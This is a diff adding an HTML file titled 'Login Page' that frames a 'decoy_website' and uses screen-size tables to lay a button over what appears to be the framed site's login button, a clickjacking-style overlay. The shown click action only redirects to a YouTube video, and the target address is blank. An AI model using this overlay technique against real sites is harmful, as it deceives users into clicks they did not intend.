@@ -1,0 +1,142 @@
+<html>
+<meta charset="utf-8">
+<html lang="en">
+	<head>
+		<title>Login Page</title>
+		<link rel="shortcut icon" type="image/x-icon" href="">
+		<style>
+		    #buttonz {
+		      position:relative;
+		      width:55px;
+		      height:25px;
+		      opacity:1;
+		      z-index:2;
+		      left: 0px;
+		      top: 0px;
+		      }
+		    #decoy_website {
+		      position:absolute;
+		      z-index:1;
+		      }
+
+		</style>
+	</head>
+
+	<body>
+  		<iframe style="border:none;" id="decoy_website"  scrolling=false loading="eager" src="" sandbox="allow-forms allow-same-origin allow-scripts" offsetLeft = "0" ></iframe>
+		<button class="favorite styled" id="buttonz" type="button"></button>
+	</body>
+
+	<script>
+		var iFrame = document.getElementById( 'decoy_website' );
+		var buttonz = document.getElementById( 'buttonz' );
+
+		iFrame.addEventListener("load", function() {
+			var tgt = document.getElementById( 'btnLogin' );
+			
+		});
+
+		var w = window.innerWidth;
+		var h = window.innerHeight;	
+
+		console.log("iFrame.width = %s;\niFrame.height = %s;",w,h);
+
+		if (h >= 2560){
+			//2560×1440
+			iFrame.width = 2560;
+			iFrame.height = 1440;
+			buttonz.style.left = 1176 +'px';
+			buttonz.style.top = 333 +'px';
+		} else if (h <= 1920 && h > 1680) {
+			if (w >= 1080){
+			//1920×1080
+				iFrame.width = 1920;
+				iFrame.height = 1080;
+				buttonz.style.left = 1003 +'px';
+				buttonz.style.top = 288 +'px';
+			} else {
+			//1920x485
+				iFrame.width = 1920;
+				iFrame.height = 485;
+				buttonz.style.left = 1000 +'px';
+				buttonz.style.top = 285 +'px';
+			}
+		} else if (h <= 1680 && h > 1600) {
+			//1680×1050
+			iFrame.width = 1680;
+			iFrame.height = 1050;
+			buttonz.style.left = 940 +'px';
+			buttonz.style.top = 273 +'px';
+		} else if (h <= 1600 && h > 1536) {
+		//1600×900
+			iFrame.width = 1600;
+			iFrame.height = 900;
+			buttonz.style.left = 920 +'px';
+			buttonz.style.top = 267 +'px';
+		} else if (h <= 1536 && h > 1440) {
+			if (h >= 864){
+		//1536×864
+			iFrame.width = 1536;
+			iFrame.height = 864;
+			buttonz.style.left = 903 +'px';
+			buttonz.style.top = 260 +'px';
+			} else {
+		//1536x750
+			iFrame.width = 1536;
+			iFrame.height = 750;
+			buttonz.style.left = (1536 * .59) +'px';
+			buttonz.style.top = (750 * .35) +'px';
+		}
+		} else if (h <= 1440 && h > 1366) {
+		//1440×900
+			iFrame.width = 1440;
+			iFrame.height = 900;
+			buttonz.style.left = 878 +'px';
+			buttonz.style.top = 253 +'px';
+		} else if (h <= 1366 && h > 1280) {
+		//1366×768
+			iFrame.width = 1366;
+			iFrame.height = 768;
+			buttonz.style.left = 860 +'px';
+			buttonz.style.top = 250 +'px';
+		} else if (h <= 1280 && h > 360) {
+			if (w >= 800){
+		//1280×800
+				iFrame.width = 1280;
+				iFrame.height = 800;
+				buttonz.style.left = 836 +'px';
+				buttonz.style.top = 244 +'px';
+			} else {
+		//1280×720
+				iFrame.width = 1280;
+				iFrame.height = 720;
+				buttonz.style.left = 836 +'px';
+				buttonz.style.top = 244 +'px';
+			}
+		} else if (h <= 360 && h > 0) {
+		//360×640
+			iFrame.width = 360;
+			iFrame.height = 640;
+			buttonz.style.left = 275 +'px';
+			buttonz.style.top = 225 +'px';
+		} else {  
+			console.log("Defaulted");
+			iFrame.width = w;
+			iFrame.height = h;
+		
+			buttonz.style.left = (w * .59) +'px';
+			buttonz.style.top = (h * .35) +'px';
+		}
+
+		var rect = buttonz.getBoundingClientRect();
+		console.log("%sx%s - Button",rect.left,rect.top);
+ 
+ 		var decoy = document.getElementById("decoy_website");
+
+		document.getElementById("buttonz").addEventListener("click", myFunction);
+
+		function myFunction() {
+  			window.open("https://www.youtube.com/watch?v=4wX2xBOuzRg","_self"); 
+		}
+	</script>
+</html>
